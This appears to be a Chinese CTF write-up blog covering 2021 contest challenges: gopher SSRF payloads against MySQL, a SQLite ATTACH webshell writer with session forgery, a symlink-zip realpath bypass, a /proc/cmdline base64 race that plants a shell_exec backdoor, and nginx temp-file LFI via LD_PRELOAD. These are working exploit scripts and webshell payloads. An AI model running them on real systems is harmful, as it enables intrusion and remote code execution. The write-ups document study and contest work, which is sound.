#“url”:”gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%52%00%00%00%03%63%72%65%61%74%65%20%66%75%6e%63%74%69%6f%6e%20%73%79%73%5f%65%76%61%6c%20%72%65%74%75%72%6e%73%20%73%74%72%69%6e%67%20%73%6f%6e%61%6d%65%20%27%2f%76%61%72%2f%6c%69%62%2f%6d%79%73%71%6c%2d%66%69%6c%65%73%2f%6d%79%73%71%6c%75%64%66%2e%73%6f%27%01%00%00%00%01” #“url”:”gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%19%00%00%00%03%73%65%6c%65%63%74%20%73%79%73%5f%65%76%61%6c%28%27%6c%73%20%2f%27%29%3b%01%00%00%00%01” # #“url”:”gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%20%00%00%00%03%73%68%6f%77%20%76%61%72%69%61%62%6c%65%73%20%6c%69%6b%65%20%27%67%65%6e%65%72%61%6c%25%27%3b%01%00%00%00%01” “url”:”gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%23%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%6s1%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%27%3b%01%00%00%00%01” #“url”:”gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%34%00%00%00%03%73%65%74%20%67%6c%6f%62%61%6c%20%67%65%6e%65%72%61%6c%5f%6c%6f%67%5f%66%69%6c%65%3d%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%20%01%00%00%00%01” #“url”:”gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%1f%00%00%00%03%73%65%74%20%67%6c%6f%62%61%6c%20%67%65%6e%65%72%61%6c%5f%6c%6f%67%20%3d%20%22%4f%4e%22%3b%01%00%00%00%01” #“url”:”gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%15%00%00%00%03%75%73%65%20%63%74%66%3b%73%68%6f%77%20%74%61%62%6c%65%73%3b%01%00%00%00%01” #“url”:”gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%75%73%65%20%63%74%66%3b%73%68%6f%77%20%63%6f%6c%75%6d%6e%73%20%66%72%6f%6d%20%75%73%65%72%73%3b%01%00%00%00%01” #“url”:”gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%20%00%00%00%03%75%73%65%20%63%74%66%3b%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%70%61%73%73%77%6f%72%64%3b%01%00%00%00%01” #“url”:”gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%1d%00%00%00%03%75%73%65%20%63%74%66%3b%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72%73%3b%01%00%00%00%01” #“url”:”gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01” #“url”:”gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%1d%00%00%00%03%75%73%65%20%63%74%66%3b%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72%73%3b%01%00%00%00%01” #“url”:”gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01” } r=requests.post(url=url,data=data,proxies={“http”:None}) print(r.text) ``` 成功导出php文件 得到flag \\ICS-工控控制软件分析** IDA反编译后，发现在WinMain函数内部存在可疑的异或行为，有点怀疑是flag的加密，点击去追踪后 竟然是一段指令，按理说应该是一段字符才对，所以可能是显示有问题，有IDA强制转换为字符串 先试试前4个字符的异或结果，看看是什么 输出的结果就是flag，后面只需把后面内容加上即可 Master Of VM 首先用给的账号密码ssh连上靶机 查看到根目录下存在一个flag文件和一个可执行文件，flag无法读取 可执行文件执行了一下，貌似是用来比较两个文件的内容，但是不让创建文件，否则应该可以用来对比？然后退出去到根目录下找有没有可能可以写的文件来实现这个想法，结果到了目录发现了另外一个flag文件","link":"/2021/12/09/2021%E9%BB%91%E7%9B%BE%E6%9D%AF/"},{"title":"2021hxp","text":"shitty看源码，是一个sqlite，但是看了一下docker文件，最终是要让我们执行/readflag的，所以我们肯定要命令执行，看看能不能写shell进去 之前学过sqlite写shell的，所以直接拿出来看看，可以使用attach写shell，而且也没看到什么过滤之类的，但是要在哪个语句写倒是个问题 我们可控的命令执行语句只有这两条 function insert_entry($db, $content, $user_id) { $sth = $db-&gt;prepare('INSERT INTO entry (content, user_id) VALUES (?, ?)'); $sth-&gt;execute([$content, $user_id]);}function delete_entry($db, $entry_id, $user_id) { $db-&gt;exec(&quot;DELETE from entry WHERE {$user_id} &lt;&gt; 0 AND id = {$entry_id}&quot;); 第一个execute execute(sql[, parameters])执行一条 SQL 语句。 可以使用 占位符 将值绑定到语句中 exec 可以执行多条SQL指令 但其实看了一下，也确实是下面这个delete_entry能构造闭合然后去命令执行多条语句。 在这个语句当中，有三个变量，跟了一下，发现只有user_id是可控的，而user_id是前面的seesion的值，也就是说，我们需要伪造session 那么现在思路其实就很明确了： 伪造session-&gt;sqlite使用attach写马 首先看看他的session是如何生成的。主要是以下这部分内容， else { $session = explode('|', $_COOKIE['session']); if( ! hash_equals(crypt(hash_hmac('md5', $session[0], $secret, true), $salt), $salt.$session[1])) { exit(); } $id = $session[0]; $mac = $session[1];} 以前看到伪造session都觉得很麻烦，不想做，现在是时候去面对它了 这题伪造session的漏洞在于crypt，首先我们知道，hash_quals是对比两个参数的哈希值是否相同，然后crypt有一个这样的特性，由于它是启用二进制的形式输出，则会导致存在以0字节开头的id经过md5加密以后的值和mac值相等，那么我们只要找到这个mac值，然后再去重新跑id，让他和我们的恶意语句拼接以后的值经过crypt后为0字节就可以绕过了。那么如何获取这个mac值呢？就是去循环跑，因为要得到两个一样的mac值基本上是不可能的，除非这两个id都为0字节id。 接下来写一下脚本: 这里发现了一个以前没发现的细节。。。 在python中s=request.sessions.get()用了第一句以后，接下来在用s来发送请求，此时已经表示在同一个会话下了，如果想要得到不同的cookie，需要直接用requests.get()来发送请求 最后使用多线程去跑，可以提高成功率 import requestsfrom urllib.parse import unquotefrom urllib.parse import quoteimport threadingimport randomurl=&quot;http://110.42.133.120:8080/&quot;def get_mac(): mac_list=[] rtmac=&quot;&quot; while True: try: re=requests.get(url) session=unquote(re.headers['Set-Cookie']) session=session.split(&quot;=&quot;)[1].split(&quot;|&quot;) orgin_id=session[0] mac=session[1] if mac in mac_list: return mac else: mac_list.append(mac) print(&quot;orgin_id&quot;,orgin_id) print(&quot;mac&quot;, mac) except: passdef writ_shell(mac,id): payload=&quot;1;ATTACH DATABASE '/var/www/html/data/tlif3.php' AS shell ;create TABLE shell . exp ( webshell text);insert INTO shell . exp (webshell) VALUES (x'3c3f706870206576616c28245f4745545b22726464225d293b3f3e');--&quot; session = quote(&quot;{payload}{id}|&quot;.format(payload=payload,id=i)+mac) cookie = { &quot;session&quot;:session, } res = requests.get(url,cookies=cookie) if &quot;Blog&quot; in res.text or int(len(res.text)&gt;0): print(cookie) print(res.content) data={ &quot;content&quot;:&quot;hello&quot; } pushcontent=requests.post(url,data=data,cookie=cookie) print(pushcontent.content) print(&quot;\\n::delete::\\n&quot;) data={ &quot;delete&quot;:&quot;1&quot; } delete=requests.post(url,data=data,cookie=cookie) print(delete.content) exit(-1)if __name__==&quot;__main__&quot;: mac=get_mac() #mac=&quot;a&quot; for num in range(1000): print(&quot;num: &quot;, num) thread_list = [] for i in range(0, 20): id = random.randint(1, 9223372036854775807) m = threading.Thread(target=writ_shell, args=(mac,id)) thread_list.append(m) for m in thread_list: m.start() for m in thread_list: m.join() unzipper&lt;?phpsession_start() or die('session_start');$_SESSION['sandbox'] ??= bin2hex(random_bytes(16));$sandbox = 'data/' . $_SESSION['sandbox'];$lock = fopen($sandbox . '.lock', 'w') or die('fopen');flock($lock, LOCK_EX | LOCK_NB) or die('flock');@mkdir($sandbox, 0700);chdir($sandbox) or die('chdir');if (isset($_FILES['file'])) system('ulimit -v 8192 &amp;&amp; /usr/bin/timeout -s KILL 2 /usr/bin/unzip -nqqd . ' . escapeshellarg($_FILES['file']['tmp_name']));else if (isset($_GET['file'])) if (0 === preg_match('/(^$|flag)/i', realpath($_GET['file']) ?: '')) readfile($_GET['file']);fclose($lock); 看到压缩文件马上就想到软链接了，正好之前有一个比赛没去做到，这次正好复现熟悉一下。 审计一下代码，发现在读文件的时候会经过一些过滤操作，有个realpath的函数 expr1?:expr3 expr1在求值时如果为true返回expr1否则返回expr3 接下来理解 理解一下什么是软链接 软链接： 保存了其代表的文件的绝对路径，是另外一种文件，在硬盘上有独立的区块，访问时替换自身路径。 通俗来说就是将一个文件A的绝对路径放在另一个文件B里面，访问这个B文件的路径实际上是访问A文件。 接下来我们尝试上传一下，可以看到，使用readfile同样可以读取其中的软链接 但是在这题，没有那么容易，因为他新增加了一个realpath，可以看到使用了realpath以后，显示的就是他的软链接了，此时要是用readfile+软链接读取flag就不太可能了 这里还需要补充一点，软链接需要和zip组合才能发挥作用，这样解压以后的软链接此时链接到才是该台服务器上的文件。如果只是单纯软链接存在是不行的。比如说我在A电脑上创建了一个软链接，将这个软链接文件放到B上，访问这个软链接文件的时候，数据仍然是A电脑上的。 那么这个题目的重点就是绕过这个正则匹配 这里就是一个小trick，readfile是可以读取php的伪协议的，那么也就是说，我们上传一个zip，里面包含两个文件，一个是伪协议，伪协议读取的是另一个文件，而另一个文件的内容就是flag的地址 上面这个方法不行，所以再想想，首先readfile可以读取协议，那么我们就可以用伪协议，这点是确定的，那么要如何使用伪协议来绕过呢？ 我们知道，通过realpath，软链接就会被直接转化为真实链接，就无法绕过正则，但如过我们将一个读取文件的协议作为各个目录串联起来，这样在realpath这里，会被解析为一个目录，而在readfile又会被解析为协议第一级目录是file:第二级目录是/var这样一直往下然后完整目录连接起来就是：file:/var/www/html/data/xxxxx/软链接当我们访问file:///var/www/html/data/xxxxx/的时候经过realpath处理以后会变成file:/var/www/html/data/xxxxx/软链接此时则是指向一个空目录而在readfile中又是file:///var/www/html/data/xxxxx/软链接此时就可以读取到flag了 但是这样的话在构造压缩包的时候其实挺麻烦的 另外一个考点就是通过session得到文件保存路径了，开了session，可以直接 session_start() or die('session_start');$_SESSION['sandbox'] ??= bin2hex(random_bytes(16));$sandbox = 'data/' . $_SESSION['sandbox']; 因为有docker，直接find一下session的保存路径就可以了 所以我们的解题步骤也很明了了 这里还有一个比较奇怪的事，当我在本地测试的时候，怎么弄都是false 后面又去瞅了一下源码才发现，原来它是在所创建的新的目录下进行操作的，所以可以使用相对路径！！！！所以此时realpath在检查file://xxx的时候返回的就是true，如果没有这个，返回的就是false了 $lock = fopen($sandbox . '.lock', 'w') or die('fopen');fclose 讲一下这个脚本的核心的思路，就是创建一个文件目录，还有一个软链接，将两个合并压缩即可 import requestsimport reimport oss=requests.session()url=&quot;http://110.42.133.120:1234&quot;sess_r=s.get(url)sess=sess_r.headers['Set-Cookie']sess_f=re.findall(r'=(.*?);',sess)print(sess_f)file_path=f'/var/lib/php/sessions/sess_{sess_f[0]}'sandbox=s.get(url+f'/?file={file_path}')print(sandbox.text)flag_path=re.findall(r'&quot;(.*?)&quot;',sandbox.text)print(flag_path)#创建zip文件soft_fi=&quot;leak&quot;zip_path=f'file:///var/www/html/data/{flag_path[0]}/{soft_fi}'os.system(&quot;rm -rf leak go.zip file:&quot;)os.system(f&quot;ln -s /flag.txt leak&quot;)os.system(f&quot;mkdir -p {zip_path}&quot;)os.system(f&quot;zip --symlinks -r go.zip file: {soft_fi}&quot;)file={ &quot;file&quot;:open('./go.zip','rb')}r=s.post(url,files=file)flag=s.get(url+f'/?file={zip_path}')print(flag.text) 小结这道题其实核心思路不难，但是有很多细节要注意，而且可能也是自己理解不够透彻，审计能力还不够强，导致很多细节没注意到，卡了很久。这里重新理一下。 1.审计源码，发现代码是可以直接查询上传内容的，也就是可以使用相对路径，因为开了fopen 2.发现路径是存储在session当中，可以通过docker找到session存放路径 3.使用了unzip解压指令，意味着我们可以使用软链接读取文件，但是由于正则匹配的存在，主要是realpath，导致我们无法直接使用软链接，需要绕过。 3.因为readpath可以读取url，也即可以使用伪协议来读取文件，所以我们可以创建一个由协议组成的文件目录级，当realpath读取这个伪协议的时候，会将其视为一个文件目录，从而绕过验证，指的一提的是，因为此时可以使用相对路径读取才有这个操作的可能。而我们在另外创建一个软链接，而针对file://协议而言，读取的是绝对路径，所以我们就可以读取到这个软链接。 解法二这个解法二是队里大师傅想的，简直就是天才，重点在于他那个/etc/passwd，看一下我的，还去找session，就很麻烦，他直接覆盖一下，直接读/etc/passwd就可以读到flag了。 import requestsimport zipfileimport osurl = &quot;http://65.108.176.76:8200/&quot;file_name = &quot;file:///flag.txt&quot;file_ln = &quot;/etc/passwd&quot;os.system(&quot;rm -f &quot;+file_name)os.system(&quot;cp /etc/passwd- /etc/passwd&quot;)os.system(&quot;rm -f hi.zip&quot;)os.symlink(file_ln, file_name)os.system(&quot;zip -ry file.zip file\\:/&quot;)req = requests.session()file = {&quot;file&quot;:open(&quot;file.zip&quot;,'rb')}res = req.post(url,files=file)print(&quot;upload success&quot;)print(res.text)res = req.get(url+&quot;?file=&quot;+file_name)print(url+&quot;?file=&quot;+file_name)print(&quot;get file success&quot;)print(res.text) counter&lt;?php$rmf = function($file){ system('rm -f -- '.escapeshellarg($file));};$page = $_GET['page'] ?? 'default';chdir('./data');if(isset($_GET['reset']) &amp;&amp; preg_match('/^[a-zA-Z0-9]+$/', $page) === 1) { $rmf($page);}file_put_contents($page, file_get_contents($page) + 1);include_once($page); 看起来简单，但是不会做的题目，看完wp大概是理解了 因为系统命令会创建proc/$PID/cmdline，因此我们可以通过包含这个进程来进行命令执行，但是我们只能输入字母和数字，那么怎么命令执行可以执行只由数字字母组成的呢？那就是base64编码以后的内容，因此我们可以使用phpfilter的base64解码包含文件名就可以进行命令执行了。 但是复现没成功，感觉以我现在的实力是做不出来了。。。贴一下脚本，以后研究吧 #!/usr/bin/env python3import requests, threading, time,os, base64, re, tempfile, subprocess,secrets, hashlib, sys, random, signalfrom urllib.parse import urlparse,quote_from_bytesdef urlencode(data, safe=''): return quote_from_bytes(data, safe)url = f'http://{sys.argv[1]}:{sys.argv[2]}/'backdoor_name = secrets.token_hex(8) + '.php'secret = secrets.token_hex(16)secret_hash = hashlib.sha1(secret.encode()).hexdigest()print('[+] backdoor_name: ' + backdoor_name, file=sys.stderr)print('[+] secret: ' + secret, file=sys.stderr)code = f&quot;&lt;?php if(sha1($_GET['s'])==='{secret_hash}')echo shell_exec($_GET['c']);&quot;.encode()payload = f&quot;&quot;&quot;&lt;?php if(sha1($_GET['s'])==='{secret_hash}')file_put_contents(&quot;{backdoor_name}&quot;,$_GET['p']);/*&quot;&quot;&quot;.encode()payload_encoded = b'abcdfg' + base64.b64encode(payload)print(payload_encoded)assert re.match(b'^[a-zA-Z0-9]+$', payload_encoded)# check if the payload would work on our local php setupwith tempfile.NamedTemporaryFile() as tmp: tmp.write(b&quot;sh\\x00-c\\x00rm\\x00-f\\x00--\\x00'&quot;+ payload_encoded +b&quot;'&quot;) tmp.flush() o = subprocess.check_output(['php','-r', f'echo file_get_contents(&quot;php://filter/convert.base64-decode/resource={tmp.name}&quot;);']) print(o, file=sys.stderr) assert payload in o os.chdir('/tmp') subprocess.check_output(['php','-r', f'$_GET = [&quot;p&quot; =&gt; &quot;test&quot;, &quot;s&quot; =&gt; &quot;{secret}&quot;]; include(&quot;php://filter/convert.base64-decode/resource={tmp.name}&quot;);']) with open(backdoor_name) as f: d = f.read() assert d == 'test'pid = -1N = 10done = Falsedef worker(i): time.sleep(1) while not done: print(f'[+] starting include worker: {pid + i}', file=sys.stderr) s = f&quot;&quot;&quot;bombardier -c 1 -d 3m '{url}?page=php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3D%2Fproc%2F{pid + i}%2Fcmdline&amp;p={urlencode(code)}&amp;s={secret}' &gt; /dev/null&quot;&quot;&quot; os.system(s)def delete_worker(): time.sleep(1) while not done: print('[+] starting delete worker', file=sys.stderr) s = f&quot;&quot;&quot;bombardier -c 8 -d 3m '{url}?page={payload_encoded.decode()}&amp;reset=1' &gt; /dev/null&quot;&quot;&quot; os.system(s)for i in range(N): threading.Thread(target=worker, args=(i, ), daemon=True).start()threading.Thread(target=delete_worker, daemon=True).start()while not done: try: r = requests.get(url, params={ 'page': '/proc/sys/kernel/ns_last_pid' }, timeout=10) print(f'[+] pid: {pid}', file=sys.stderr) if int(r.text) &gt; (pid+N): pid = int(r.text) + 200 print(f'[+] pid overflow: {pid}', file=sys.stderr) os.system('pkill -9 -x bombardier') r = requests.get(f'{url}data/{backdoor_name}', params={ 's' : secret, 'c': f'id; ls -l /; /readflag; rm {backdoor_name}' }, timeout=10) if r.status_code == 200: print(r.text) done = True os.system('pkill -9 -x bombardier') exit() time.sleep(0.5) except Exception as e: print(e, file=sys.stderr)","link":"/2022/01/11/2021hxp/"},{"title":"nginx缓存写入文件","text":"ez_php这里直接说一下结论吧 让后端 php 请求一个过大的文件 Fastcgi 返回响应包过大，导致 Nginx 需要产生临时文件进行缓存 虽然 Nginx 删除了/var/lib/nginx/fastcgi下的临时文件，但是在 /proc/pid/fd/ 下我们可以找到被删除的文件 遍历 pid 以及 fd ，使用多重链接绕过 PHP 包含策略完成 LFI 接下来就是分步骤写一下脚本了，首先是让后端php请求一个过大的文件 我看了一下，其他师傅们的wp都加上了一些字符，以扩大整个文件大小，但是我感觉不加好像也没事，视情况而定吧 def uploader(): print('[+] starting uploader') while not done: requests.get(URL, data=open(&quot;hack.so&quot;,&quot;br&quot;).read()) 接下来就是爆破pid和fd使其能够被成功访问到，而我在自己的机器上docker是在10的位置，而在其他的服务器就不一定了，所以需要一个个的去爆破，但其实应该也不会特别久 这里有几个细节说明一下 1.nginx worker我们找的是nginx worker所在的proc，这里才存储了被删除的临时文件的fd 而要找到这个proc的值只能爆破，就是搞一个一样的环境，看看docker里面的生成pid数字是多少，但是我感觉还是要从0开始挨个爆破才行 2.proc/pid/fd这里的fd也是需要爆破获得，大小的话也是直接从0开始吧，感觉去找或者对比的话，其实比较难找到 3.多线程爆破而这里脚本的编写为了提高命中率，也是推荐多线程爆破，在上传完文件的同时，去包含多个pid，提高命中率 def bruter(): pid=10 while True: print(f'[+] brute loop restarted: {pid}') for fd in range(4, 32): f = f'/proc/{pid}/fd/{fd}' r = requests.get(URL, params={ 'env': f&quot;LD_PRELOAD={f}&quot;, }) 完整expimport sys, threading, requests# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for detailsURL = 'http://110.42.133.120:1234/index.php'done = False# upload a big client body to force nginx to create a /var/lib/nginx/body/$Xdef uploader(): print('[+] starting uploader') while not done: requests.get(URL, data=open(&quot;hack.so&quot;,&quot;br&quot;).read())for _ in range(16): t = threading.Thread(target=uploader) t.start()# brute force nginx's fds and pidsdef bruter(): pid=10 while True: print(f'[+] brute loop restarted: {pid}') for fd in range(4, 32): f = f'/proc/{pid}/fd/{fd}' r = requests.get(URL, params={ 'env': f&quot;LD_PRELOAD={f}&quot;, })a = threading.Thread(target=bruter)a.start() counter这个也是hxp的题，然后也是我没遇到过的姿势，也学习下，感觉 &lt;?phpdeclare(strict_types=1);$rand_dir = 'files/'.bin2hex(random_bytes(32));mkdir($rand_dir) || die('mkdir');putenv('TMPDIR='.__DIR__.'/'.$rand_dir) || die('putenv');echo 'Hello '.$_POST['name'].' your sandbox: '.$rand_dir.&quot;\\n&quot;;try { if (stripos(file_get_contents($_POST['file']), '&lt;?') === false) { include_once($_POST['file']); }}finally { system('rm -rf '.escapeshellarg($rand_dir));} 源码在这里，分析之类的过程就省略了，直接说结论以及存在的漏洞点 1. 其中配置文件有一个比较明显的配置错误： location /.well-known { autoindex on; alias /var/www/html/well-known/;} 开启了列目录并且我们可以遍历到上层文件夹。 2.compress.zip://流进行上传任意文件，但是产生的是临时文件，为了能够尽可能长时间的留在服务器上，我们需要让他停留时间久一点 使用大文件传输，这样在传输的时候就会有一定的时间让我们包含到文件了。 使用 FTP 